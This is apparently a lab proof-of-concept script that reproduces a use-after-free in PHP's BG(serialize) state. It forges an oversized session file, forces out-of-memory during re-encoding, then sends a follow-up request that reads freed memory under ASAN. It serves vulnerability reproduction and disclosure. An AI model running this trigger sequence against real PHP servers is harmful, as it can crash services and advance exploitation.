#!/usr/bin/env python3
"""PoC runner: BG(serialize) cross-request use-after-free (local lab only).

WHAT THIS PROVES
  A request that ends with an unclean shutdown during session re-encoding
  leaves BG(serialize).level > 0 while BG(serialize).data points at memory
  freed by request shutdown. The next request on the same process reuses that
  context during multipart parsing and reads freed memory.

WHAT THIS DOES NOT DO
  No heap grooming, no pointer/address control, no code execution attempt.
  It requires local write access to the session save path to forge the large
  session file, so it is a lab trigger, not a remote exploit. ASAN aborts on
  the first invalid access.

Usage:
  python3 linux/poc-bgserialize.py --version 8.4.4 --iterations 5
"""
import argparse
import http.cookiejar
import json
import os
import re
import secrets
import signal
import socket
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from probe import multipart  # noqa: E402

REPO = Path(__file__).resolve().parents[1]
BASE = Path('/home/phplab/php-lab')
PORT = 18087
SESSION_FIELD = 'PHPSESSID'
PROGRESS_FIELD = 'PHP_SESSION_UPLOAD_PROGRESS'


def free_port(port, timeout=5.0):
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            with socket.socket() as sock:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.bind(('127.0.0.1', port))
            return True
        except OSError:
            time.sleep(0.2)
    return False


class Server:
    def __init__(self, prefix, out, env):
        self.out = out
        self.env = env
        self.proc = None
        self.handle = None
        ini = (REPO / 'config/php.ini').read_text() + '\n'
        ini += ('session.upload_progress.min_freq=0\n'
                'memory_limit=%s\n'
                'session.save_path=%s\n'
                'upload_tmp_dir=%s\n'
                'error_log=%s\n' % (os.environ.get('POC_MEMORY_LIMIT', '8M'),
                                     out / 'sessions', out / 'uploads', out / 'php-error.log'))
        (out / 'php.ini').write_text(ini)
        self.cmd = [str(prefix / 'bin/php'), '-c', str(out / 'php.ini'),
                    '-S', '127.0.0.1:%d' % PORT, '-t', str(REPO / 'web'),
                    str(REPO / 'web/index.php')]

    def start(self):
        self.handle = (self.out / 'server.log').open('a')
        self.proc = subprocess.Popen(self.cmd, env=self.env, stdout=self.handle,
                                     stderr=subprocess.STDOUT, start_new_session=True)
        deadline = time.time() + 20
        while time.time() < deadline:
            if self.proc.poll() is not None:
                raise RuntimeError('server exited during startup')
            try:
                with urllib.request.urlopen('http://127.0.0.1:%d/health' % PORT, timeout=2) as res:
                    if json.load(res).get('ok'):
                        return
            except Exception:
                time.sleep(0.15)
        raise RuntimeError('server startup timeout')

    def stop(self):
        if self.proc and self.proc.poll() is None:
            try:
                os.killpg(self.proc.pid, signal.SIGTERM)
                self.proc.wait(timeout=8)
            except Exception:
                try:
                    os.killpg(self.proc.pid, signal.SIGKILL)
                except Exception:
                    pass
        if self.handle:
            self.handle.close()


def health():
    try:
        with urllib.request.urlopen('http://127.0.0.1:%d/health' % PORT, timeout=3) as res:
            return json.load(res).get('ok') is True
    except Exception:
        return False


def read_asan(out):
    reports = sorted((out / 'sessions').parent.glob('asan.*'))
    if not reports:
        return None
    text = reports[0].read_text(errors='replace')
    if 'AddressSanitizer' not in text:
        return None
    summary = next((line for line in text.splitlines() if 'SUMMARY' in line), '')
    first_frame = next((line.strip() for line in text.splitlines()
                        if 'php_add_var_hash' in line), '')
    return dict(file=str(reports[0]),
                is_uaf='heap-use-after-free' in text,
                summary=summary,
                first_frame=first_frame)


def one_iteration(prefix, base_out, env, index):
    out = base_out / ('iter-%02d' % index)
    (out / 'sessions').mkdir(parents=True, exist_ok=True)
    (out / 'uploads').mkdir(parents=True, exist_ok=True)
    sid_big = 'pocbig' + secrets.token_hex(8)
    sid_small = 'pocsmall' + secrets.token_hex(8)
    big = 'A' * (3 * 1024 * 1024)
    (out / 'sessions' / ('sess_' + sid_big)).write_text('big|s:%d:"%s";' % (len(big), big))
    (out / 'sessions' / ('sess_' + sid_small)).write_text('small|a:1:{i:0;i:7;}')
    record = dict(iteration=index)
    server = Server(prefix, out, env)
    try:
        if not free_port(PORT):
            raise RuntimeError('port %d still bound' % PORT)
        server.start()
        # Warm-up mirrors the instrumented run: health, two session roundtrips and
        # one clean progress upload. Without it the very first request decodes under
        # different live-allocation conditions and the OOM can land in decode.
        for _ in range(2):
            health()
        for _ in range(2):
            try:
                urllib.request.urlopen('http://127.0.0.1:%d/session' % PORT, timeout=3).read()
            except Exception:
                pass
        multipart(PORT, '/upload', fields=[(PROGRESS_FIELD, 'pocW')],
                  file_spec=('file', 'w.bin', b'W' * (64 * 1024)), chunk_size=32768,
                  chunk_delay=0.02)
        # request A: decode + re-encode a 3MB session during parse -> OOM mid-encode
        req_a = multipart(PORT, '/upload',
                          fields=[(SESSION_FIELD, sid_big), (PROGRESS_FIELD, 'pocA')],
                          file_spec=('file', 'a.bin', b'K' * 32768))
        time.sleep(0.3)
        error_log = (out / 'php-error.log')
        oom = 'Allowed memory size of' in (error_log.read_text(errors='replace')
                                           if error_log.exists() else '')
        decode_failed = 'Failed to decode session object' in (error_log.read_text(errors='replace')
                                                              if error_log.exists() else '')
        record.update(request_a_status=req_a['status'], oom_logged=oom,
                      decode_failed_before_encode=decode_failed)
        if not oom:
            record.update(request_b_status=None, result='no_oom_triggered')
            return record
        # IMPORTANT: no HTTP request may be sent between A and B. Any request that
        # reaches zend_activate_modules runs PHP_RINIT_FUNCTION(basic), which
        # memsets BG(serialize) and would erase the residue before it is reused.
        # request B: parse-time encode reuses the freed BG(serialize) context
        req_b = multipart(PORT, '/upload',
                          fields=[(SESSION_FIELD, sid_small), (PROGRESS_FIELD, 'pocB')],
                          file_spec=('file', 'b.bin', b'L' * 16384))
        time.sleep(0.3)
        record.update(request_b_status=req_b['status'])
        asan = None
        deadline = time.time() + 8
        while time.time() < deadline:
            asan = read_asan(base_out)
            if asan and asan['is_uaf']:
                break
            time.sleep(0.2)
        record.update(asan=asan,
                      process_alive_after_b=health(),
                      result=('uaf_reproduced' if asan and asan['is_uaf']
                              else 'no_uaf_observed'))
        return record
    finally:
        server.stop()


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--version', default='8.4.4')
    parser.add_argument('--flavor', choices=['asan'], default='asan')
    parser.add_argument('--allocator', choices=['tracked'], default='tracked')
    parser.add_argument('--iterations', type=int, default=5)
    args = parser.parse_args()

    prefix = BASE / 'install' / (args.version + '-' + args.flavor)
    manifest = json.loads((prefix / 'build-manifest.json').read_text())
    stamp = time.strftime('%Y%m%dT%H%M%S', time.gmtime()) + '-' + str(os.getpid())
    out = BASE / 'evidence' / ('poc-%s-%s-%s' % (stamp, args.version, args.allocator))
    out.mkdir(parents=True)
    env = os.environ.copy()
    env.update(ASAN_OPTIONS='detect_leaks=0:abort_on_error=1:symbolize=1:log_path=%s/asan' % out,
               ASAN_SYMBOLIZER_PATH='/usr/bin/llvm-symbolizer',
               USE_ZEND_ALLOC='0', USE_TRACKED_ALLOC='1')
    (out / 'env.json').write_text(json.dumps(dict(
        build=manifest, allocator=args.allocator,
        asan_options=env['ASAN_OPTIONS'], scope='local lab trigger PoC'), indent=2))

    results = [one_iteration(prefix, out, env, index) for index in range(1, args.iterations + 1)]
    reproduced = sum(1 for item in results if item['result'] == 'uaf_reproduced')
    summary = dict(scope='local lab trigger PoC; no exploitation attempt',
                   version=args.version, allocator=args.allocator,
                   iterations=args.iterations, reproduced=reproduced,
                   reproduction_rate=round(reproduced / args.iterations, 3),
                   results=results, evidence=str(out))
    (out / 'result.json').write_text(json.dumps(summary, indent=2))
    print(json.dumps({k: summary[k] for k in ('version', 'allocator', 'iterations',
                                              'reproduced', 'reproduction_rate',
                                              'evidence')}, indent=2))
    print(json.dumps([dict(i=r['iteration'], a=r.get('request_a_status'),
                           b=r.get('request_b_status'), result=r['result'],
                           frame=(r.get('asan') or {}).get('first_frame'))
                      for r in results], indent=2))
    return 0 if reproduced == args.iterations else 1


if __name__ == '__main__':
    sys.exit(main())
